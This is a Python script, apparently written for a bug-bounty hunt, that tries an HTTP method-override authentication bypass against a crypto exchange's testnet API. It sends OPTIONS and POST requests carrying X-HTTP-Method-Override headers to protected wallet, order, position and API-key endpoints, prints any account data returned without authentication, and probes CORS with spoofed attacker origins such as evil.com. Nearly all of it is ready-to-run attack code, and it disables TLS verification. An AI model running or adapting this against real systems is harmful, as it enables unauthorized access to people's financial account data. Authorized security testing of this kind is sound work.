#!/usr/bin/env python3
"""
EXPLOIT: HTTP Method Override Authentication Bypass
Found: OPTIONS returns 200 instead of 401 with X-HTTP-Method-Override header
"""
import requests
import json

requests.packages.urllib3.disable_warnings()

api = "https://api-testnet.bybit.com"

print("="*80)
print("üö® EXPLOITING HTTP METHOD OVERRIDE BYPASS")
print("="*80)

# Test all protected endpoints
protected_endpoints = [
    "/v5/account/wallet-balance",
    "/v5/position/list",
    "/v5/user/query-api",
    "/v5/order/realtime",
    "/v5/order/history",
    "/v5/execution/list",
    "/v5/account/transaction-log",
    "/v5/asset/transfer/query-account-coins-balance",
    "/v5/account/fee-rate",
]

print("\n[1] TESTING ALL PROTECTED ENDPOINTS")
print("-"*80)

vulnerable_endpoints = []

for endpoint in protected_endpoints:
    # Normal GET - should fail
    r1 = requests.get(api + endpoint, timeout=5, verify=False)
    
    # OPTIONS with override header
    headers = {
        "X-HTTP-Method-Override": "GET"
    }
    r2 = requests.options(api + endpoint, headers=headers, timeout=5, verify=False)
    
    # POST with override
    headers_post = {
        "X-HTTP-Method-Override": "GET"
    }
    r3 = requests.post(api + endpoint, headers=headers_post, timeout=5, verify=False)
    
    print(f"\n{endpoint}")
    print(f"  GET: {r1.status_code}")
    print(f"  OPTIONS+Override: {r2.status_code} (Length: {len(r2.text)})")
    print(f"  POST+Override: {r3.status_code}")
    
    # Check if bypass worked
    if r2.status_code == 200 or r3.status_code == 200:
        print(f"  üö® BYPASS DETECTED!")
        vulnerable_endpoints.append(endpoint)
        
        # Try to get actual data
        if len(r2.text) > 0:
            print(f"  OPTIONS Response: {r2.text[:300]}")
            try:
                data = json.loads(r2.text)
                if 'result' in data and data['result']:
                    print(f"  üö®üö®üö® GOT DATA WITHOUT AUTH!")
                    print(f"  Data: {json.dumps(data, indent=2)[:500]}")
            except:
                pass
                
        if len(r3.text) > 0 and r3.status_code == 200:
            print(f"  POST Response: {r3.text[:300]}")

# Test 2: Try with different override methods
print("\n\n[2] TESTING DIFFERENT HTTP METHOD OVERRIDES")
print("-"*80)

test_endpoint = "/v5/account/wallet-balance"
override_methods = ["GET", "POST", "PUT", "PATCH", "DELETE"]

for method in override_methods:
    headers = {
        "X-HTTP-Method-Override": method,
        "X-Original-Method": "GET"
    }
    
    r = requests.options(api + test_endpoint, headers=headers, timeout=5, verify=False)
    print(f"\n  Override: {method}")
    print(f"  Status: {r.status_code}, Length: {len(r.text)}")
    
    if r.status_code == 200:
        print(f"  ‚ö†Ô∏è  Success! Response: {r.text[:200]}")

# Test 3: Try to bypass with parameters
print("\n\n[3] TESTING WITH PARAMETERS")
print("-"*80)

params_tests = [
    {"category": "spot"},
    {"coin": "USDT"},
    {"accountType": "UNIFIED"},
]

for params in params_tests:
    headers = {"X-HTTP-Method-Override": "GET"}
    r = requests.options(api + test_endpoint, headers=headers, params=params, timeout=5, verify=False)
    
    print(f"\n  Params: {params}")
    print(f"  Status: {r.status_code}")
    if r.status_code == 200 and len(r.text) > 10:
        print(f"  Response: {r.text[:300]}")

# Test 4: Check CORS headers (might allow from any origin)
print("\n\n[4] CHECKING CORS CONFIGURATION")
print("-"*80)

origins = [
    "https://evil.com",
    "null",
    "https://bybit.com.attacker.com"
]

for origin in origins:
    headers = {
        "Origin": origin,
        "X-HTTP-Method-Override": "GET"
    }
    r = requests.options(api + test_endpoint, headers=headers, timeout=5, verify=False)
    
    acao = r.headers.get('Access-Control-Allow-Origin', '')
    acac = r.headers.get('Access-Control-Allow-Credentials', '')
    
    if acao:
        print(f"\n  Origin: {origin}")
        print(f"  ACAO: {acao}")
        print(f"  ACAC: {acac}")
        
        if acao == origin or acao == '*':
            print(f"  ‚ö†Ô∏è  CORS allows this origin!")

print("\n\n" + "="*80)
print("SUMMARY")
print("="*80)

if vulnerable_endpoints:
    print(f"\n‚úì Found {len(vulnerable_endpoints)} potentially vulnerable endpoints:")
    for ep in vulnerable_endpoints:
        print(f"  - {ep}")
    
    print("\nüéØ EXPLOITATION PATH:")
    print("1. Use OPTIONS method with X-HTTP-Method-Override: GET")
    print("2. Endpoint returns 200 OK instead of 401 Unauthorized")
    print("3. Check if response contains sensitive data")
    print("4. If yes, this is Authentication Bypass vulnerability")
    
    print("\nüí∞ SEVERITY: HIGH (if data is accessible)")
    print("   Bounty Range: $1,500 - $5,000")
else:
    print("\n‚úó No authentication bypass found")
    print("  The 200 OK responses are likely empty or CORS preflight")

print("="*80)
